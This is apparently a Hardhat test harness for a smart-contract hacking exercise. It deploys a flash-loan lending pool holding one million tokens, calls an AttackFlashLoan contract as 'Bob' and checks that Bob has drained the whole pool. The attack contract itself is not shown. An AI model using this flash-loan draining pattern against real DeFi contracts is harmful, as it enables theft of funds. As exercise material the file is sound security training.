const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Attack Flash Token", function () {
  let alice, bob;

  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

  before(async function () {
    [alice, bob] = await ethers.getSigners();

    const FlashToken = await ethers.getContractFactory(
      "FlashToken",
      alice
    );
    const TokenLender = await ethers.getContractFactory(
      "TokenLender",
      alice
    );

    this.token = await FlashToken.deploy();
    this.pool = await TokenLender.deploy(this.token.address);

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(bob.address)).to.equal("0");
  });

  it("Exploit", async function () {
    console.log('Balance of Bob', await this.token.balanceOf(bob.address));
    console.log('Balance of Alice', await this.token.balanceOf(alice.address));
    console.log('Balance of TokenLender Contract', await this.token.balanceOf(this.token.address));
    console.log('Balance of Pool contract', await this.token.balanceOf(this.pool.address));
    const AttackFlashLoan = await ethers.getContractFactory(
      "AttackFlashLoan",
      alice
    );
    this.attackFlashLoan = await AttackFlashLoan.deploy();
    res = await this.attackFlashLoan.connect(bob).attack(this.pool.address, this.token.address, this.token.balanceOf(this.pool.address));
    // console.log('Result ----> ', res);
    console.log('Balance', await this.token.balanceOf(bob.address));
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Bob has taken all tokens from the pool
    if (
      expect(await this.token.balanceOf(bob.address)).to.equal(
        TOKENS_IN_POOL
      ) &&
      expect(await this.token.balanceOf(this.pool.address)).to.equal("0")
    ) {
      console.log(`You have hacked the Flash Token Lender contract .`);
    }
  });
});
